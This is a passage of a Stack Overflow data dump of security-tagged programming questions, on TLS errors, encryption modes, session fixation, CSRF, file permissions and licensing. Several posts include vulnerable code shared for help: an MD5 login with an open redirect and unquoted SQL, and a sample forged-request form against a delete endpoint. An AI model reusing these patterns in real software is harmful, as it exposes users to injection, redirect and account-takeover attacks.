see:</p>\n\n<blockquote>\n  <p>[ACTIVE] ExecuteThread: '10' for queue: 'weblogic.kernel.Default\n  (self-tuning)', handling exception: java.net.SocketException:\n  Connection reset [ACTIVE] ExecuteThread: '10' for queue:\n  'weblogic.kernel.Default (self-tuning)', SEND TLSv1 ALERT:  fatal,\n  description = unexpected_message [ACTIVE] ExecuteThread: '10' for\n  queue: 'weblogic.kernel.Default (self-tuning)', WRITE: TLSv1 Alert,\n  length = 32 [ACTIVE] ExecuteThread: '10' for queue:\n  'weblogic.kernel.Default (self-tuning)', Exception sending alert:\n  java.net.SocketException: Broken pipe</p>\n</blockquote>\n\n<p>So far I have tried the following to understand/replicate it:</p>\n\n<ul>\n<li>Connecting via OpenSSL with the certs loaded - works OK every time</li>\n<li>Connecting via secure ldapsearch with the certs loaded - works OK every time</li>\n<li>Connecting via a custom test Java client - works OK every time</li>\n<li>Decrypting the SSL handshake with Wireshark and the private key.</li>\n</ul>\n\n<p>What I noticed with Wireshark for the \"bad\" hand shake, is that after the client sends a Change Cipher Spec, Finished message AD does not reply in kind. More so, Wireshark cannot decrypt the SSL handshake, failing with:</p>\n\n<blockquote>\n  <p>ssl_decrypt_pre_master_secret wrong pre_master_secret length (109,\n  expected 48) dissect_ssl3_handshake can't decrypt pre master secret</p>\n</blockquote>\n\n<p>Note Wireshark SSL decryption works perfectly when the SSL handshake works perfectly.</p>\n\n<p>I can't see any significant differences in the good and bad SSL handshakes, until the point where the AD server does not respond.</p>\n\n<p>At this point I'm stumped... I'm really struggling to understand why this would fail for some of the time and work the rest, at this point I am really just hoping for some suggestions as to what might be going on.</p>\n\n<p>Oh yes, almost forgot. There is an error in the Active Directory Event log: </p>\n\n<blockquote>\n  <p>Event ID: 36888 The following fatal alert was raised: 20. The state of\n  the internal error is 960.</p>\n</blockquote>\n\n<p>Which, after a bit of research I managed to discover corresponds to an SSL \"BAD_RECORD_MAC\" error.</p>\n\n<p>The only theory I have at this point, is that for some reason the wrong public key is being used to encrypt the handshake... I can't see otherwise why the server (and Wireshark) would fail to decrypt the finished message.</p>\n\n<p>Thanks!</p>\n\n<p>Updates:</p>\n\n<p>I've compared the bad and good cases, the cipher spec in both cases is the same: TLS_RSA_WITH_AES_128_CBC_SHA. I have also compared the packets from both the client and server side, barring the normal Ethernet and IP protocol differences they are all seemingly identical.</p>\n"},{"tags":["php","security"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12453868,"title":"vulnerability when user log in","body":"<p>I have a problem with my web page. I have a link, such a <code>www.example.com/news/news.php?news=123</code>. I also have a login script and here occurs a problem. When user is not logged in then mentioned link works fine. But when user log in then this link is redirected to some other page, like www.google.com.</p>\n\n<p>What kind of vulnerability is that?\nEdit:</p>\n\n<p>Here is my code: <strong>login</strong></p>\n\n<pre><code>if (isset($_SESSION['user'])) {\n    include_once $_SERVER['DOCUMENT_ROOT']. '/users/logout.php';\n} else {\n    if(isset($_POST['login'])) {    \n        include_once $_SERVER['DOCUMENT_ROOT']. '/library/base/dbinfo.inc.php';\n\n        $username = mysql_real_escape_string($_POST['username']);\n        $password = mysql_real_escape_string($_POST['password']);   \n        $uri_checkuser = mysql_real_escape_string($_POST['uri_checkuser']);\n\n        $password = md5($password);\n\n        $sql = mysql_query(\"SELECT * FROM users WHERE username='$username' AND password='$password' AND activated='1'\");\n        $login_check = mysql_num_rows($sql);\n\n        if($login_check &gt; 0){\n\n            if ($_POST['RememberPasswd'] == \"Remember\") {\n                setcookie (\"RememberPassword\", $username, time () + 1296000, \"/\");\n            }\n\n            while($row = mysql_fetch_array($sql)){\n                foreach( $row AS $key =&gt; $val ){\n                    $$key = stripslashes( $val );\n                }\n                session_register('userid');\n                $_SESSION['userid'] = $userid;\n                session_register('first_name');\n                $_SESSION['first_name'] = $first_name;\n                session_register('last_name');\n                $_SESSION['last_name'] = $last_name;\n                session_register('user');\n                $_SESSION['user'] = $username;\n\n                $salt = rand(1,100000);\n\n                session_register('salt');\n                $_SESSION['salt'] = $salt;\n\n                mysql_query(\"UPDATE users SET last_login=now(), salt='$salt' WHERE userid='$userid'\");\n                $loginOK = 1;\n\n                header(\"Location: http://\".$_SERVER['HTTP_HOST'].$uri_checkuser);\n                exit();\n\n            }\n        } else {\n            $wrong_password = \"Wrong password\";\n        }       \n    }\n\n    if ($loginOK == 1){\n        include_once $_SERVER['DOCUMENT_ROOT']. '/users/logout.php';\n    } else {\n        include_once $_SERVER['DOCUMENT_ROOT']. '/users/checkuser_form.php';\n    }   \n}\n</code></pre>\n\n<p><strong>news.php</strong></p>\n\n<pre><code>&lt;?\nob_start();\nsession_start();\ninclude_once $_SERVER['DOCUMENT_ROOT']. '/library/encoding/encoding.html';\ninclude_once $_SERVER['DOCUMENT_ROOT']. '/library/base/dbinfo.inc.php';\ninclude_once $_SERVER['DOCUMENT_ROOT']. '/library/head_foot/header.php';\n?&gt;\n\n&lt;td width=\"568\" valign=\"top\"&gt;\n        &lt;table&gt;\n      &lt;tr&gt;\n        &lt;td class=\"box175\"&gt;&lt;br&gt;\n&lt;?\n\nif (isset($_GET['news'])) {\n    $newsid = mysql_real_escape_string($_GET['news']);\n    $sql_check = mysql_query(\"SELECT newsid FROM news WHERE newsid='$newsid'\");\n    $sql_check_num = mysql_num_rows($sql_check);\n\n    if ($sql_check_num &gt; 0){\n        include_once $_SERVER['DOCUMENT_ROOT']. '/news/news_viewed.php';\n    } else {\n        ?&gt;&lt;div align=\"left\"&gt;&lt;span class=\"Main\"&gt;News does not exists. &lt;/span&gt;&lt;/div&gt;&lt;br&gt;&lt;?              \n    }\n\n} else {\n    header(\"Location: http://\" . $_SERVER['HTTP_HOST']. \"/\");\n}\n\n?&gt;\n&lt;/td&gt;\n      &lt;/tr&gt;\n    &lt;/table&gt;\n    &lt;/td&gt;\n\n&lt;? \n\ninclude_once $_SERVER['DOCUMENT_ROOT']. '/library/head_foot/footer.php';\n\nob_end_flush();     \n?&gt;\n</code></pre>\n\n<p><strong>news_viewed.php</strong></p>\n\n<pre><code>&lt;?\nsession_start();\n$newsid = mysql_real_escape_string($_GET['news']);\n$sql_news = mysql_query(\"SELECT newsid, title, body, pic1, alt1, date, locked FROM news WHERE newsid = $newsid\");\n$sql_news_num = mysql_num_rows($sql_news);\n\n$sql_news_comments = mysql_query(\"SELECT news_commid, newsid_comm, comment, user, date, edit_date FROM news_comments WHERE newsid_comm = '$newsid' ORDER BY date ASC\");\n$sql_news_comments_num = mysql_num_rows($sql_news_comments);\n\nlist ($newsid, $title, $body, $pic1, $alt1, $date, $locked) = mysql_fetch_row ($sql_news);\n\n                $body = nl2br ($body);\n\necho $body;\n\n//for comments\nif (isset($_SESSION['user'])) {\n    if ($sql_news_comments_num &gt;= 1){\n\n        $k=1;\n        while ($k &lt;= $sql_news_comments_num) {\n            list ($news_commid, $newsid_comm, $comment, $user_comm, $date_comm, $edit_date_comm) = mysql_fetch_row ($sql_news_comments);\n            $comment = nl2br ($comment);\n            include $_SERVER['DOCUMENT_ROOT']. '/news/string_replace_comment.php';\n\n            $sql_user = mysql_query(\"SELECT email_address, signup_date, comments, info FROM users WHERE username = '$user_comm'\");\n            if ($sql_user){\n                list ($email_address, $user_signup_date, $user_comments, $info) = mysql_fetch_row ($sql_user);\n            } else {\n                echo mysql_error();\n            }\n\n            echo $user_comm;\n            echo $date_user; \n            echo $user_comments;\n\n        }\n    }\n}\n?&gt;\n</code></pre>\n"},{"tags":["java","mysql","security","jdbc"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":73,"score":2,"question_id":12452928,"title":"Does JDBC do anything to protect my password and username from sniffing?","body":"<p>I'm working on a front end for a database I have set up and I was wondering if I just use this code will my password and username show up in plain text if some one is sniffing?</p>\n\n<pre><code>String url = \"jdbc:mysql://\" + address + \"/table\";\nString user = user_Name;\nString password = complete_Password;\n\nConnection conn = null;\ntry {\n    conn = DriverManager.getConnection(url, user, password);\n    return conn;\n} catch (SQLException ex) {\n    System.out.println(ex);\n}\n</code></pre>\n"},{"tags":["android","security","nfc","mifare"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":466,"score":0,"question_id":11047121,"title":"Mifare Plus vs Mifare DESfire (Android)","body":"<p>Apart from what is shown in the NXP websites regarding mifare plus and mifare desfire, considering the following factors:</p>\n\n<ol>\n<li>Security</li>\n<li>Speed of Readability</li>\n<li>When stuck with a ferrite layer so that it can be stuck on a phone, which is better?</li>\n<li>In the future if we want to get into payments, what is preferred?</li>\n<li>The size of the nfc tag stickers are going to be 35mm diameter, does it make a difference what is the tag that is used?</li>\n<li>The tags are going to be interacting with an nfc reader which is plugged in to an Android device. From an android POV, which is better? For ease of development and for more functionality which is more appropriate?</li>\n</ol>\n\n<p>Thanks</p>\n"},{"tags":["iphone","ios","security","encryption","cryptography"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":88,"score":1,"question_id":12450859,"title":"How does iOS encrypt and decrypt binaries?","body":"<p>I am an iOS developer and was wondering if anyone has insight as to how binary encryption works in iOS? I.e. does Apple sign the app using it's private key to distribute on the app store and then decrypts it with the corresponding public-key when loading the application? Or is it something other than public/private key encryption?</p>\n\n<p>Thanks!</p>\n"},{"tags":["php","apache","security","permissions","chmod"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":12450512,"title":"Creating, moving, and deleting files in php without setting directory and file permissions to 777?","body":"<p>As the title suggests, I need the ability to create, move, and delete files and folders from php. </p>\n\n<p>If I CHMOD all directories and files to 777, everything works great, but if I do 755 then the scripts die with errors about permissions. </p>\n\n<p>From what I've read, using 777 permissions is insecure and should not be done. I have a VPS, but there are multiple users as I host a number of websites (some of which other people are in control of) and, regardless, I want to do whatever is the \"best practice.\"</p>\n\n<p>So, basically, what I'm wondering is <em>how</em> I should go about this? I'm new to php and \"webmastering\" and am not sure what to do.</p>\n\n<p>Could anyone point me in the right direction?</p>\n\n<p><em>One last note: In addition to being able to move and delete files that have been created from php, the scripts also need to move and delete files that have been uploaded via FTP from a Windows machine (I've noticed that by default when I upload files the CHMOD is 755).</em></p>\n\n<p>EDIT: I it may be relevant for me to mention that I ran phpinfo() and found the following under the section \"PHP Credits\":</p>\n\n<pre><code>User/Group      nobody(99)/99 \n</code></pre>\n"},{"tags":["java","security","tomcat","sso","jsessionid"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12421765,"title":"Good practices and pitfalls when bypassing a SSO system through another server?","body":"<p>I'm in charge of maintaining a web application (Lives on a Tomcat server) which has two different access points, through two Apache HTTPD servers which are outside of my reach.</p>\n\n<p>The two access points are meant to log in user either through a third-party SSO system or a good ol' authentication page which prompts for login and password.</p>\n\n<p>The trick is, this SSO puts a limit on the size of files which can be uploaded or downloaded. As SSO users will need to retrieve and send things heavier than that, I need a workaround for this, most likely simply offering a link pointing to the correct resource location through the other server.</p>\n\n<p>What concerns me here is security, in case someone enters a cleverly guessed address to get a document he's not supposed to. The person in charge doesn't want to hear about a SessionManager to make sure the user has the rights to retrieve the documents, but suggested that I could simply use their JSESSSION_ID to confirm their identity...</p>\n\n<p>I am not sure about how to implement this, and have a serious gut feeling that this will backfire in a quite horrible fashion.</p>\n\n<p><strong>Can anyone who had to deal with a similar problem points some of the pitfalls and possibly share a few useful tips on how to securely bypass this SSO ?</strong></p>\n"},{"tags":["php","security","permissions","chmod","777"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":75,"score":0,"question_id":12450350,"title":"Is it safe to CHMOD directories 777 on a VPS?","body":"<p>I have some php scripts that need to move, create and delete files and folders. Unless I CHMOD the folders to 777 the php scripts die with errors about permissions. CHMOD'ing the folders to 777 fixes the problem, but after a <em>lot</em> of reading I'm still confused as to whether it's OK to do or not.</p>\n\n<p>I've read that it can be dangerous on shared hosting, but my question is, is it safe to do on a VPS?</p>\n"},{"tags":["security","session","web-applications"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12404577,"title":"Session fixation with session in cookies","body":"<p>There are a lot of questions and answers about session fixation on StackOverflow, however, I am still confused about one thing. People often suggest that storing session in cookies is not enough to overcome the session fixation issue and you should rotate the session id after login. I can imagine that if you only use the session id to identify a user, you may still be vulnerable to an attack. However, I would like to ask about one specific case.</p>\n\n<p>Let's assume that you use a signed cookie to store the whole session. On login you put into the cookie an id identifying the user. After logout, you delete the id. You do not change the session id, but as you change the session itself and you sign it, I cannot see any attack scenario taking advantage of this design. Is session fixation still an issue and, hence, is session id rotation still necessary in this case? If yes, can you provide an attack that could be used? Thank you.</p>\n"},{"tags":["security","mcrypt","rijndael","ecb","identical"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":12445312,"title":"Is ECB a safe option if you don't expect duplicate results?","body":"<p>I want to encrypt long paragraphs of text using Rijndael-256 (the text has been compressed and converted to base64 before this).</p>\n\n<p>It is very unlikely for the two to be the same. But if they happen to be, would adding a random key to the start or end of the text secure it (regardless of whether they're the same), just in case users write the same text?</p>\n\n<p>If I make sure that no results are 100% the same, is ECB safe if you won't get duplicate results?</p>\n\n<p>Or is it like this: (using base64... not accurate, just an example)</p>\n\n<pre><code>_Hello world_ = ahjkIOn25o\n\n_To echo \"Hello world,\"_ = qw90klnN2_ahjkIOn25o_kL3\n\n_Hello world is the_ = _ahjkIOn25o_hjAB27\n</code></pre>\n\n<p>So if someone has a phrase hidden inside their text, it would always output the same ECB for that piece, no matter what else is in the text, or the phrase's position in the text?</p>\n"},{"tags":["c#","security","authorization","roles","user"],"answer_count":6,"favorite_count":14,"up_vote_count":14,"down_vote_count":0,"view_count":5246,"score":14,"question_id":1222974,"title":"Authentication, Authorization, User and Role Managment and general Security in .NET","body":"<p>I need to know how to go about implementing general security for a C# application. What options do I have in this regard? I would prefer to use an existing framework if it meets my needs - I don't want to re-invent the wheel.</p>\n\n<p>My requirements are as follows:</p>\n\n<ul>\n<li>the usual username/password authentication</li>\n<li>manageing of users - assign permissions to users</li>\n<li>managing of roles - assign users to roles, assign permissions to roles</li>\n<li>authorization of users based on their username and role</li>\n</ul>\n\n<p>I am looking for a free / open-source framework/library that has been time-tesed and used by the .Net community.</p>\n\n<p>My application takes a client/server approach, with the server running as a windows service, connecting to a SQL Server database. Communication between client and server will be through WCF.</p>\n\n<p>One other thing that is important is that I need to be able to assign specific users or roles permissions to View/Update/Delete a specific entity, whether it be a Customer, or Product etc. For e.g. Jack can view a certain 3 of 10 customers, but only update the details of customers Microsoft, Yahoo and Google, and can only delete Yahoo.</p>\n"},{"tags":["c#","asp.net","security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":283,"score":1,"question_id":2714413,"title":"How to implement User base security not role base in asp.net?","body":"<p>I have to implement User base security in my Web project using .Net3.5. Followings are some we need:</p>\n\n<ol>\n<li>Roles can be Admin, Manage, Editor, Member etc</li>\n<li>User can have multiple roles</li>\n<li>Every roles has its own dynamic menus and restrictions/resources</li>\n<li>All menus and interface will populate dynamically from Database</li>\n</ol>\n\n<p>I heard some where this kind of i.e user base security can be implemented using HashTable but I dont know how is it?</p>\n\n<p>Today I came to know that for this kind of work Java people use Interceptor Design patterns. So, how could I do the same in asp.net C#?</p>\n"},{"tags":["c","security","runtime-error"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":101,"score":2,"question_id":12446965,"title":"Segmentation fault when byte coding a function?","body":"<p>I get a segmentation fault when I run the following C program (compiled with gcc in Ubuntu). </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nchar f[] = \"\\x55\\x48\\x89\\xe5\\x48\\x89\\x7d\\xf8\\x48\\x89\\x75\\xf0\\x48\\x8b\\x45\\xf8\\x8b\\x10\\x48\\x8b\\x45\\xf0\\x8b\\x00\\x89\\xd1\\x29\\xc1\\x89\\xc8\\xc9\\xc3\";\n\nint main()\n{\n    int (*func)();\n    func = (int (*)()) f;\n\n    int x=3,y=5;\n    printf(\"%d\\n\",(int)(*func)(&amp;x,&amp;y));\n    return 0;\n}\n</code></pre>\n\n<p>The string <code>f</code> contains the machine code of the following function.</p>\n\n<pre><code>int f(int*a, int*b)\n{\n    return *a-*b;\n}\n</code></pre>\n\n<p>c.f.:</p>\n\n<pre><code>f.o:     file format elf64-x86-64\n\nDisassembly of section .text:\n\n0000000000000000 &lt;f&gt;:\n   0:   55                      push   %rbp\n   1:   48 89 e5                mov    %rsp,%rbp\n   4:   48 89 7d f8             mov    %rdi,-0x8(%rbp)\n   8:   48 89 75 f0             mov    %rsi,-0x10(%rbp)\n   c:   48 8b 45 f8             mov    -0x8(%rbp),%rax\n  10:   8b 10                   mov    (%rax),%edx\n  12:   48 8b 45 f0             mov    -0x10(%rbp),%rax\n  16:   8b 00                   mov    (%rax),%eax\n  18:   89 d1                   mov    %edx,%ecx\n  1a:   29 c1                   sub    %eax,%ecx\n  1c:   89 c8                   mov    %ecx,%eax\n  1e:   c9                      leaveq \n  1f:   c3                      retq   \n</code></pre>\n\n<p>This is compiled using:</p>\n\n<pre><code>gcc test.c -Wall -Werror\n./a.out\nSegmentation fault\n</code></pre>\n\n<p>The expected output is <code>-2</code> - how can I get it to work?</p>\n"},{"tags":["asp.net","asp.net-mvc","ajax","security"],"answer_count":4,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":1808,"score":5,"question_id":1346070,"title":"ASP.net MVC AntiForgeryToken over AJAX","body":"<p>I am currently developing an MVC application in ASP.net. I am using AJAX.ActionLink to provide a delete link in a list of records, however this is very insecure. I have put this:</p>\n\n<pre><code>&lt;AcceptVerbs(HttpVerbs.Post)&gt;\n</code></pre>\n\n<p>Over the function to do the deleting, which stops the function being called simply by a URL. However, the other security hole that still exists is that if i were to make a basic html page with this content:</p>\n\n<pre><code>&lt;form action=\"http://foo.com/user/delete/260\" method=\"post\"&gt;\n&lt;input type=\"submit\" /&gt;\n&lt;/form&gt;\n</code></pre>\n\n<p>It would still be perfoming a post, but from a different location.</p>\n\n<p>Is it possible to use the AntiForgeryToken with an AJAX ActionLink? If so, is this a secure approach? Are there more security holes i haven't realised?</p>\n"},{"tags":["php","security","mcrypt","hmac","cbc-mode"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12445709,"title":"How to use CBC and HMac? Mcrypt PHP","body":"<p>How do you use CBC and HMAC?</p>\n\n<p>I couldn't find enough information on the internet.</p>\n\n<p>How do you get the IV? How would you know what it is when you need to decrypt later? (Wouldn't putting it in the database defeat the purpose?)</p>\n\n<p>What is HMAC, and is it protected from hacking?</p>\n\n<p>The encrypted text stays in the database. If someone hacks into the database, they would probably have access to the file manager too, unless they found a way to do SQL injection. How would the script know which IV and key to use, that the hacker wouldn't know?</p>\n\n<p>What is the best method to use when encrypting multiple paragraphs of text, which will only be seen within the website by the user who wrote it? (The user always views it as plain text.)</p>\n\n<p>I use ECB now (the website has not yet been released for beta) but I've heard that CBC is much more secure.</p>\n"},{"tags":["php","security","cpanel","injection","anti-hacking"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":84,"score":0,"question_id":12445454,"title":"Security of PHP and anti-hacking? What is worthwhile and what is not?","body":"<p>I had a question about encrypting text, but here is the anti-hacking portion of it.</p>\n\n<p>How would people get gain access to the encrypted text?</p>\n\n<p>My website is secured against SQL injection, and the conversion is server-side  the user only sees what they have written as they A. write it, and B. read it later. They never see the encrypted text, just the plain-text.</p>\n\n<p>Would someone have to hack onto the cPanel to see the database text? But would they see the encryption PHP scripts too? Or, instead, they could log on as the user by changing the hashed password and security settings and view the user's private documents...</p>\n\n<p>If you've protected your website against SQL injection and XSS, is it still vulnerable to other information-stealing attacks? (Not DDos)</p>\n\n<p>What is worthwhile, and what is just \"futile\"?</p>\n\n<p><em>(Also, would blocking &lt;>s from all input, but allowing escaped, html-entities-encoded \"s and 's in things like messages and forum posts be safe? Is there a list of what to block?)</em></p>\n"},{"tags":["html","security","escaping"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12360646,"title":"How is HTML attribute encoding/escaping different than regular HTML encoding?","body":"<p>I've noticed the OWASP recommends using <a href=\"http://owasp-esapi-java.googlecode.com/svn/trunk_doc/latest/org/owasp/esapi/Encoder.html#encodeForHTMLAttribute%28java.lang.String%29\" rel=\"nofollow\">a different encoding method</a> specifically for encoding HTML Attributes, and in ASP.NET MVC there is <a href=\"http://msdn.microsoft.com/en-us/library/system.web.mvc.htmlhelper.attributeencode%28v=vs.108%29.aspx\" rel=\"nofollow\">a helper method</a> specifically to encode attributes.</p>\n\n<p>However, I haven't been able to think of any situation where an HTML-encoded string wouldn't work in the context of an HTML attribute. Are there cases where using standard HTML encoding would be insufficient or incorrect? If not, why are these extra methods provided in some frameworks?</p>\n\n<p>(Note that <a href=\"http://commons.apache.org/lang/api/org/apache/commons/lang3/StringEscapeUtils.html\" rel=\"nofollow\">not all string escaping frameworks</a> provide such methods.)</p>\n"},{"tags":["c#","asp.net","security","forms-authentication"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12442823,"title":"ASP.net custom forms securty","body":"<p>I am not sure what it is called what I want, so that is the main reason I post here, I am new to asp.net / mvc and just webdevelopement. However I got a WCF service that got (custom) security. (IAuthorizationPolicy, IPrincipal and UserNamePasswordValidator).</p>\n\n<p>However I am failing to find a good article on ASP.net security. All the guides I find is about sql membership provider, with a automatic genareted databse, but ofc I don't want to create a new user table etc, I want to use my old one (with already hunderds of users in it). But I know I ll need to add a new table to keep track of cookies (so I can compare the GUID to the cookie GUID, or something I dunno I am just reading here and there). But could anyone please provide me a good tutorial for custom forms authentication, ps I must also be able to give access to roles,(I got a (role)table for it as well already). Is it then possible to use authorization with atributes like:</p>\n\n<pre><code>[PrincipalPermission(SecurityAction.Demand, Role = \"Admin\")]\npublic ActionResult GetUserStats(int userid)\n{\n</code></pre>\n\n<p>PS: I know I ll get shot because this question will be too open etc, I did research, didn t find any up to date(ASP.NET mvc 4, the one with all the openauth stuff and webmatrix security preinstalled) article how to do this all.</p>\n\n<p>EDIT: <a href=\"http://dotnetspeak.com/index.php/2011/07/asp-net-mvc-custom-authentication/\" rel=\"nofollow\">http://dotnetspeak.com/index.php/2011/07/asp-net-mvc-custom-authentication/</a> seems to be the best article I've found so far, but it uses json, and memory reader/writer lol? And it doesn t save sessions in a DB ? Not certain or it is a good method, any advice?</p>\n"},{"tags":[".net","vb.net","performance","security","obfuscation"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":80,"score":1,"question_id":12444460,"title":"Eziriz .NET Reactor Obfuscator performance","body":"<p>I am planning to use .net reactor v4.5 to secure my application. I have a .NET 2.0 application written in vb.net optimized for performance. If I choose the \"Application Strongest\" preset in the software, will it slow down the performance of my application due to the overhead process of decrypting / guarding the application every time it runs?</p>\n\n<p>Thanks,\nAlbert</p>\n"},{"tags":["android","security"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":85,"score":0,"question_id":11779310,"title":"Android Security Pattern","body":"<p>I want to create a custom screen lock (more precisely a Pattern, like the one that's activated in Settings -> Security -> Screen lock and then selecting Pattern). I have been searching a while and found nothing about it and don't know if even it is possible. </p>\n\n<p>Is it possible?.</p>\n"},{"tags":["php","security","mcrypt","anti-hacking","ecb"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":12443111,"title":"Is ECB safe if you don't expect duplicate results?","body":"<p>I want to encrypt long paragraphs of text using Rijndael-256 (the text has been compressed and converted to base64 before this).</p>\n\n<p>It is very unlikely for the two to be the same. But if they happen to be, would adding a random key to the start or end of the text secure it (regardless of whether they're the same), <em>just in case</em> users write the same text?</p>\n\n<p>Also, how would people get this encrypted text? My website is secured against SQL injection, and the conversion is server-side  the user only sees what they have written as they A. write it, and B. read it later.\nWould someone have to hack onto the cPanel to see the text? But they they'd see the encryption code too? Or they could log on as the user by changing the hashed password and security settings and view the user's private documents...\nSo is there any point in this type of security? What is worthwhile, and what is just \"futile\"?\n(You can mail me if you want to deter potential hackers. But I think they'd already know this...)</p>\n\n<p>Thanks for reading.\nMy question is: Is ECB safe if you won't get duplicate results?</p>\n\n<p>I can't find enough information for CBC and HMAC, so how would you go about doing this? How would you know the IV when you want to duplicate it? (Wouldn't putting it in the database defeat the purpose?)</p>\n\n<p>Sorry if I sound clueless. I've been programming since 2009 but still don't know things like this...</p>\n"},{"tags":["php","security","permissions"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":12439833,"title":"How to protect PHP from the public?","body":"<p>So I'm a bit confused about what crafty users can and can't see on a site.</p>\n\n<p>If I have a file with a bunch of php script, the user cant see it just by clicking \"view source.\"  But is there a way they can \"download\" the entire page including the php?</p>\n\n<p>If permission settings should pages be set to, if there is php script that must execute on load but that I dont want anyone to see?</p>\n\n<p>Thanks</p>\n"},{"tags":["security","mobile","phishing"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":12439499,"title":"How do you prevent phishing in mobile app?","body":"<p>Imagine a scenario in which a game X installed on your mobile device wants to access your account information from social network Y. Assume that Y exposes some API, and have features like \"login with Y\" etc. On desktop PC X could popup new browser window, with domain of Y clearly shown in address bar, with a padlock icon clearly indicating SSL connection, and in this popup, social network Y would ask user to provide login, password, and agreement to pass some information (like name, avatar, e-mail) to the application X. For example OAuth 2 uses this approach. </p>\n\n<p>In my opinion, on mobile the situation is in rather different, as application X can take control of whole screen. In particular it can draw on the device's screen something that is indistinguishable from a real browser and hijack login and password provided by user. </p>\n\n<p>How one can combat malicious applications which cover whole screen and pretend to be browsers, or even OS's settings windows etc?</p>\n"},{"tags":["c#","security","piracy-prevention"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":300,"score":2,"question_id":6815967,"title":"How to make Software Secure?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/506282/protect-net-code-from-reverse-engineering\">Protect .NET code from reverse engineering?</a>  </p>\n</blockquote>\n\n\n\n<p>I want to make my software that it doesn't get distributed without being purchased?</p>\n\n<p>One way i thought was to make web service and keep track and all stuff.</p>\n\n<p>But limitation is that not all the computers have Internet so this comes out of the question.</p>\n\n<p>One idea was that I get the computer information like <code>CPU Serial Number</code> by <code>WMI</code> and then buld that software to run on system with that serial number. I cannot think of much better idea than this.</p>\n\n<p>Please help me with some ideas how to make software secure.</p>\n\n<p><strong>I don't want to protect it from being decompiled. I want that if i give the a user with a single computer licence so this software sticks with that computer and does not tun on other computer</strong></p>\n"},{"tags":["php","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12435448,"title":"Why the $_REQUEST variable is considered insecure?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/1149118/does-request-have-security-problem\">Does $_REQUEST have security problem?</a>  </p>\n</blockquote>\n\n\n\n<p>Does anyone have verifiable citations on this? What would be the roundabouts for the security holes?</p>\n"},{"tags":["ruby-on-rails","ruby-on-rails-3","security"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":51,"score":2,"question_id":12434286,"title":"Rails - How to secure foreign keys and still allow association selection","body":"<p>For simplicity, assume that I have a simple has-many-through relationship</p>\n\n<pre><code>class User &lt; ActiveRecord::Base\n  has_many :courses, :through =&gt; :registrations\nend\n\nclass Registration &lt; ActiveRecord::Base\n  belongs_to :user\n  belongs_to :course\nend\n\nclass Course &lt; ActiveRecord::Base\n  has_many :users, :through =&gt; :registrations\nend\n</code></pre>\n\n<p>I want to keep my app secure, so I use <code>attr_accessible</code> to whitelist my attributes.</p>\n\n<p>My question is twofold:</p>\n\n<ol>\n<li><p>How would I set up my whitelist attributes such that I could create a new Registration object through a form (passing in <code>:user</code> and <code>:course</code>, but not risk allowing those foreign keys to be maliciously updated later?</p></li>\n<li><p>How would I set up my validations such that both <code>belongs_to</code> associations are required BUT also allow for Registration objects to be created in nested forms?</p></li>\n</ol>\n"},{"tags":["java","swing","security","java-web-start","webstart"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":59,"score":3,"question_id":12425162,"title":"Exclamation point in top right of windows - over the close button","body":"<p>When I open some Java applications, especially examples launched from Java Web Start, I will often see an exclamation mark next to/covering the close button, depending on the window size. It is a bit worrying actually.</p>\n\n<p>What does it mean, and what is its function?</p>\n"},{"tags":["security","pdf","encryption"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12425158,"title":"How does strength of password relate to encryption?","body":"<p>I have a PDF document that is 128bit encrypted.</p>\n\n<p>The user insists on a four character password which is all numeric e.g. 1558 or 6977 or 4793.</p>\n\n<p>128bit encryption is strong - is this strength negated by the password weakness?</p>\n"},{"tags":["php","security","authentication"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":99,"score":0,"question_id":12422211,"title":"Restrict php script to only one computer without login","body":"<p>I want to make a php webpage accessible from only one computer. </p>\n\n<p>IP checking isn't suitable for that (Dynamic IP).</p>\n\n<p>I could set a cookie (with no expiration date) with a token. Then I could check if the cookie has the correct token and display the page, else I could die(). I think 